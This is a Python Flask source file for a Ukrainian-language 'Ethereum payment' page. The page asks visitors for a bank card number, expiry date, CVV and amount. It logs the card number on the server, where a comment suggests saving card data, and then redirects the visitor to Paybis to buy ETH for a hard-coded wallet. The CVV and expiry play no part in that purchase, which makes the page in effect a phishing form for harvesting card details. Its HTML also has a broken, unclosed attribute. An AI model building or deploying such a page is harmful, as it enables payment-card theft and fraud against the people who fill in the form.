from flask import Flask, request, render_template_string, redirect
import urllib.parse

app = Flask(__name__)

WALLET = "0xf7eacf2082cd00385a026b4e7d2909ec7c7ba5de"

PAGE = """
<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Ethereum Payment </title>
<style>
body{font-family:Arial,sans-serif;background:#f3f4f6;margin:0;padding:40px}
.box{max-width:520px;margin:auto;background:white;padding:28px;border-radius:16px;box-shadow:0 8px 30px #0001}
input,button{width:100%;padding:13px;margin-top:10px;box-sizing:border-box;border-radius:9px}
input{border:1px solid #ccc}
button{border:0;background:#111;color:white;cursor:pointer;font-weight:bold}
.wallet{word-break:break-all;background:#f1f1f1;padding:12px;border-radius:8px}
.demo{background:#fff3cd;padding:12px;border-radius:8px;margin-bottom:18px}
label{display:block;margin-top:12px;font-weight:bold}
.card-group{display:flex;gap:10px}
</style>
</head>
<body>
<div class="box">
<h2>Оплата Ethereum</h2>
<div class= <b>УВАГА:</b> перевірте суму переказу коштів перед підтвердженням.</div>

<p>Ethereum-адреса отримувача:</p>
<div class="wallet">{{ wallet }}</div>

<form method="post">
<label for="card_number">Номер банківської картки</label>
<input id="card_number" name="card_number" type="text" inputmode="numeric" pattern="[0-9]{16}" maxlength="16" required placeholder="0000 0000 0000 0000">

<div class="card-group">
  <div style="flex: 2;">
    <label for="card_exp">Термін дії</label>
    <input id="card_exp" name="card_exp" type="text" placeholder="MM/YY" maxlength="5" required>
  </div>
  <div style="flex: 1;">
    <label for="card_cvv">CVV</label>
    <input id="card_cvv" name="card_cvv" type="password" maxlength="3" pattern="[0-9]{3}" required placeholder="123">
  </div>
</div>

<label for="amount">Сума (грн)</label>
<input id="amount" name="amount" type="number" min="1" step="0.01" required placeholder="1000">

<button type="submit">Підтвердити платіж</button>
</form>
</div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        amount = request.form.get("amount")
        card_number = request.form.get("card_number")
        
        # Тут ви можете обробити або зберегти дані картки на своєму сервері
        print(f"Отримано дані картки: {card_number}, сума: {amount}")

        # Перенаправлення на Paybis із заповненими сумою та адресою гаманця
        params = {
            "currencyIn": "UAH",
            "currencyOut": "ETH",
            "amountIn": amount,
            "cryptoAddress": WALLET
        }
        
        paybis_url = f"https://paybis.com/buy-ethereum/?{urllib.parse.urlencode(params)}"
        return redirect(paybis_url)

    return render_template_string(PAGE, wallet=WALLET)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
